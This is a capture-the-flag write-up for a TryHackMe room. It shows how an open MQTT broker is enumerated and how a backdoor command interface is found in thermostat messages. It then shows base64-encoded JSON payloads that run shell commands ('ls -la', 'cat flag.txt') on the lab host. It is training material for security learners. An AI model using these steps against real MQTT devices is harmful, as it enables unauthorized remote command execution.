# URL
https://tryhackme.com/room/bugged
# Concept
* MQTT enumeration and remote code execution
# Method of solve
* after scanning the server with Nmap, we see that there are ports 22 and 1883 open
* 1883 is associated with the MQTT protocol, and we can interact with it using this tool:

[Python MQTT Client Shell](https://github.com/bapowell/python-mqtt-client-shell)

* once we have the tool started in Python, we can give the following commands:
```
python mqtt_client_shell.py
logging off
connection
host <IP_ADDRESS>
connect
subscribe #
```
* after subscribing, we begin to see messages coming in from different devices
* this one, from the thermostat, looks suspicious
```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```
* when decoded from base64, this is the message:
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```
* this looks like a JSON notation, and it implies we can run commands through this interface
* we'll unsubscribe from all these topics and then subscribe to only the ones indicated in this message:
```
unsubscribe #
subscribe U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
subscribe XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub
```
* next, we'll try publishing to this topic to see what response we get
```
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub test
```
* we receive this message in response:
```
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```
* which decodes to:
```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```
* so we need to send a JSON format message that is base64-encoded to interact with this system
* let's try this command to create the base64-encoded JSON:
```
echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP", "arg": ""}' | base64 -w0
```
* then publish the message in the MQTT shell:
```
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9Cg==
```
* the base64-decode response is the following:
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
```
* so it looks like we can run system command through this backdoor interface
* first we craft the command:
```
echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls -la"}' | base64 -w 0
```
* then send it to the MQTT shell:
```
publish XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMgLWxhIn0K
```
* this is the response:
```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"total 32\ndrwxr-xr-x 1 challenge challenge 4096 Mar 22  2022 .\ndrwxr-xr-x 1 root      root      4096 Mar 22  2022 ..\n-rw------- 1 challenge challenge   28 Mar 22  2022 .bash_history\n-rw-r--r-- 1 challenge challenge  220 Aug  4  2021 .bash_logout\n-rw-r--r-- 1 challenge challenge 3526 Aug  4  2021 .bashrc\n-rw-r--r-- 1 challenge challenge  807 Aug  4  2021 .profile\n-rw-r--r-- 1 root      root        39 Mar 21  2022 flag.txt\n"}
```
* perfect! Let's read that flag
```
echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64 -w 0
```

